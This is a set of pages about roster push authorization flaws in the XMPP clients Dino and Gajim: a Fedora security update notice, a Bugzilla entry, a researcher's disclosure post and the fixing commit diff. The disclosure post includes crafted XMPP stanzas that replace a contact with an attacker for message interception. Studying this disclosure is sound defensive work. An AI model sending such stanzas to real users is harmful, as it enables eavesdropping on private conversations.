* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC.mbox.gz?message=YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC/#YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC)

# [SECURITY] Fedora 31 Update: dino-0.0-0.13.20190912.git.a96c801.fc31

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

17 Sep
2019

17 Sep
'19

7:06 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2019-2555c77f63
2019-09-18 00:01:15.682637
--------------------------------------------------------------------------------

Name : dino
Product : Fedora 31
Version : 0.0
Release : 0.13.20190912.git.a96c801.fc31
URL : <https://github.com/dino/dino>
Summary : Modern XMPP ("Jabber") Chat Client using GTK+/Vala
Description :
A modern XMPP ("Jabber") chat client using GTK+/Vala.

--------------------------------------------------------------------------------
Update Information:

Update dino to
[a96c8014](<https://github.com/dino/dino/compare/016ab2c1...a96c8014>), which
addresses three CVEs. CVE-2019-16235 ============== Dino did not properly
check the source of message carbons.
<https://nvd.nist.gov/vuln/detail/CVE-2019-16235> Fixed in
<https://github.com/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930>
CVE-2019-16236 ========== Dino did not check roster push authorization.
<https://nvd.nist.gov/vuln/detail/CVE-2019-16236> Fixed in
<https://github.com/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9>
CVE-2019-16237 ========== Dinot did not properly check the source of MAM
messages. <https://nvd.nist.gov/vuln/detail/CVE-2019-16237> Fixed in
<https://github.com/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363>
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #1751851 - CVE-2019-16237: dino does not properly check the source of an MAM messages
<https://bugzilla.redhat.com/show_bug.cgi?id=1751851>
[ 2 ] Bug #1751849 - CVE-2019-16236: dino does not check roster push authorization
<https://bugzilla.redhat.com/show_bug.cgi?id=1751849>
[ 3 ] Bug #1751847 - CVE-2019-16235: Dino before does not properly check the source of a carbons
<https://bugzilla.redhat.com/show_bug.cgi?id=1751847>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2019-2555c77f63' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC/#YUBM7GDZBB6MZZALDWYRAPNV6HJNLNMC)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from bugzilla.redhat.com_04331ca1_20250121_025945.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1751849)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1751849)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1751849)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1751849

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1751849**](show_bug.cgi?id=1751849)
- CVE-2019-16236: dino does not check roster push authorization

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2019-16236: dino does not check roster push authorization

| | [Keywords](describekeywords.cgi): |  | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Fedora | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Fedora | | [Component:](describecomponents.cgi?product=Fedora "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | dino | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | rawhide | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | unspecified | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Randy Barlow | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Fedora Extras Quality Assurance | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=1751849&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1751849&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2019-09-12 17:12 UTC by Randy Barlow | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-20 01:33 UTC ([History](show_activity.cgi?id=1751849)) | | [CC List:](page.cgi?id=fields.html#cclist) | 1 user (show)  rbarlow | | Fixed In Version: | dino-0.0-0.13.20190912.git.a96c801.fc32 dino-0.0-0.13.20190912.git.a96c801.fc31 dino-0.0-0.12.20190912.git.a96c801.fc30 dino-0.0-0.12.20190912.git.a96c801.fc29 | | | Doc Type: | If docs needed, set a value | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-09-18 00:03:05 UTC | | | Type: | Bug | | | Embargoed: |  | | | [Dependent Products:](page.cgi?id=fields.html#dependent_products "Other Products that are affected by this bug.") | Ember-CSI Red Hat Enterprise Virtualization Manager Red Hat OpenStack Service Telemetry Framework | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1751849#c0)  Randy Barlow    2019-09-12 17:12:48 UTC  ``` <https://nvd.nist.gov/vuln/detail/CVE-2019-16236>   ```  [Comment 1](show_bug.cgi?id=1751849#c1)  Randy Barlow    2019-09-12 17:23:34 UTC  ``` Fixed in <https://github.com/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9>   ```  [Comment 2](show_bug.cgi?id=1751849#c2)  Fedora Update System    2019-09-12 18:07:42 UTC  ``` FEDORA-2019-3d3bb765ca has been submitted as an update to Fedora 30. <https://bodhi.fedoraproject.org/updates/FEDORA-2019-3d3bb765ca>   ```  [Comment 3](show_bug.cgi?id=1751849#c3)  Fedora Update System    2019-09-12 18:07:48 UTC  ``` FEDORA-2019-2555c77f63 has been submitted as an update to Fedora 31. <https://bodhi.fedoraproject.org/updates/FEDORA-2019-2555c77f63>   ```  [Comment 4](show_bug.cgi?id=1751849#c4)  Fedora Update System    2019-09-12 21:00:07 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc30 has been pushed to the Fedora 30 testing repository. If problems still persist, please make note of it in this bug report. See [https://fedoraproject.org/wiki/QA:Updates_Testing](https://fedoraproject.org/wiki/QA%3AUpdates_Testing) for instructions on how to install test updates. You can provide feedback for this update here: <https://bodhi.fedoraproject.org/updates/FEDORA-2019-3d3bb765ca>   ```  [Comment 5](show_bug.cgi?id=1751849#c5)  Fedora Update System    2019-09-12 22:39:39 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc29 has been pushed to the Fedora 29 testing repository. If problems still persist, please make note of it in this bug report. See [https://fedoraproject.org/wiki/QA:Updates_Testing](https://fedoraproject.org/wiki/QA%3AUpdates_Testing) for instructions on how to install test updates. You can provide feedback for this update here: <https://bodhi.fedoraproject.org/updates/FEDORA-2019-0eb6d51f81>   ```  [Comment 6](show_bug.cgi?id=1751849#c6)  Fedora Update System    2019-09-14 01:39:56 UTC  ``` dino-0.0-0.13.20190912.git.a96c801.fc31 has been pushed to the Fedora 31 testing repository. If problems still persist, please make note of it in this bug report. See [https://fedoraproject.org/wiki/QA:Updates_Testing](https://fedoraproject.org/wiki/QA%3AUpdates_Testing) for instructions on how to install test updates. You can provide feedback for this update here: <https://bodhi.fedoraproject.org/updates/FEDORA-2019-2555c77f63>   ```  [Comment 7](show_bug.cgi?id=1751849#c7)  Fedora Update System    2019-09-18 00:03:05 UTC  ``` dino-0.0-0.13.20190912.git.a96c801.fc31 has been pushed to the Fedora 31 stable repository. If problems still persist, please make note of it in this bug report.   ```  [Comment 8](show_bug.cgi?id=1751849#c8)  Fedora Update System    2019-09-20 01:22:08 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc30 has been pushed to the Fedora 30 stable repository. If problems still persist, please make note of it in this bug report.   ```  [Comment 9](show_bug.cgi?id=1751849#c9)  Fedora Update System    2019-09-20 01:33:49 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc29 has been pushed to the Fedora 29 stable repository. If problems still persist, please make note of it in this bug report.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1751849&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from gultsch.de_a3c2aa83_20250121_025948.html ===


[Daniel Gultsch](http://gultsch.de), 2015/12/20

# Gajim Roster Push Attack / Message Interception

***CVE-2015-8688:** Gajim doesnât verify the origin of roster pushes thus allowing third parties to modify the roster.*

Alice is using the latest version of [Gajim (0.16.4)](https://gajim.org) and logged in as `alice@siacs.eu/Gajim`. She has her boyfriend *Bob* (`bob@siacs.eu`) saved under *Bob* in her roster. Gajim shows Bobâs JID only in the tooltip of the respective roster entry.

![Gajim showing Bobs tooltip](/VINISlN.png)

### Changing Roster Entries

Eve, jealous of Bob, wants to intercept Aliceâs messages to Bob. She crafts two special stanzas (XMPP packets) and sends those to Alice.

```
<iq type="set" to="alice@siacs.eu/Gajim">
  <query xmlns='jabber:iq:roster'>
    <item subscription="remove" jid="bob@siacs.eu"/>
    <item subscription="both" jid="eve@siacs.eu" name="Bob" />
  </query>
</iq>
<presence to="alice@siacs.eu/Gajim">
  <show>online</show>
</presence>

```

The first stanza removes Bob from Aliceâs roster while at the same time adding Eve under the name of Bob to it. The second stanza marks herself as being online.
Alice roster will look exactly the same exact for the tooltip.

![Gajim showing fake Bob](/wWC6agn.png)

The next time Alice opens a conversation with, what she thinks is her boyfriend Bob, she will really be opening a conversation with Eve.

### Man in the middle

Doing the same to Bob - who is also using Gajim - Eve can listen in to the entire conversation between the two.

### Persistence

If Aliceâs server offers Roster Versioning those changes will even be persistent across restarts. Otherwise Eve would have to repeat sending those stanzas each time Alice goes online.

### Mitigation

Gajim should verify the origin of a roster push stanza. Those stanzas should only parsered if they are coming from the servers JID or the users own JID.

##### Predictable Resources

If Eve is not subscribed to Aliceâs presence updates she has to guess her resource to make this attack happen. However Gajims default resource of `Gajim` makes this very easy. If Gajim would be using random strings (for example UUIDs) as resource this attack could have been prevented. (But of course still possible if Eve had presence subscription.)

### Timeline

* 2015/12/20: Discovery and initial report to maintainer
* 2015/12/20: [Fixed in hg](https://trac.gajim.org/changeset/af78b7c068904d78c5dfb802826aae99f26a8947/)
* 2015/12/27: Public release
* 2015/12/28: [Gajim 0.16.5 released](https://hg.gajim.org/gajim/file/gajim-0.16.5/ChangeLog)


=== Content from github.com_7b232972_20250121_025947.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fdd33f5f949248d87d34f399e8846d5ee5b8823d9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fdd33f5f949248d87d34f399e8846d5ee5b8823d9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dino%2Fdino)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dino](/dino)
/
**[dino](/dino/dino)**
Public

* [Notifications](/login?return_to=%2Fdino%2Fdino) You must be signed in to change notification settings
* [Fork
  249](/login?return_to=%2Fdino%2Fdino)
* [Star
   2.2k](/login?return_to=%2Fdino%2Fdino)

* [Code](/dino/dino)
* [Issues
  528](/dino/dino/issues)
* [Pull requests
  33](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects
  0](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

Additional navigation options

* [Code](/dino/dino)
* [Issues](/dino/dino/issues)
* [Pull requests](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

## Commit

[Permalink](/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Check roster push authorization

[Browse files](/dino/dino/tree/dd33f5f949248d87d34f399e8846d5ee5b8823d9)
Browse the repository at this point in the history

* Loading branch information

[![@mar-v-in](https://avatars.githubusercontent.com/u/994036?s=40&v=4)](/mar-v-in)

[mar-v-in](/dino/dino/commits?author=mar-v-in "View all commits by mar-v-in")
committed
Sep 10, 2019

1 parent
[307f16c](/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)

commit dd33f5f

Showing
**1 changed file**
with
**4 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 4 additions & 0 deletions

4
[xmpp-vala/src/module/roster/module.vala](#diff-eb564c7fa7b6a590cd5e248724403f3fdbcfd1d8027f995162058a771f93c696 "xmpp-vala/src/module/roster/module.vala")

Show comments

[View file](/dino/dino/blob/dd33f5f949248d87d34f399e8846d5ee5b8823d9/xmpp-vala/src/module/roster/module.vala)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -47,6 +47,10 @@ public class Module : XmppStreamModule, Iq.Handler { |
|  |  | public void on\_iq\_set(XmppStream stream, Iq.Stanza iq) { |
|  |  | StanzaNode? query\_node = iq.stanza.get\_subnode("query", NS\_URI); |
|  |  | if (query\_node == null) return; |
|  |  | if (!iq.from.equals(stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid)) { |
|  |  | warning("Received alledged roster push from %s, ignoring", iq.from.to\_string()); |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | Flag flag = stream.get\_flag(Flag.IDENTITY); |
|  |  | Item item = new Item.from\_stanza\_node(query\_node.get\_subnode("item", NS\_URI)); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `dd33f5f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fdd33f5f949248d87d34f399e8846d5ee5b8823d9) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_9cbf5269_20250121_005011.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/5TMGQ5Q6QMIFG4NVUWMOWW3GIPGWQZVF/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
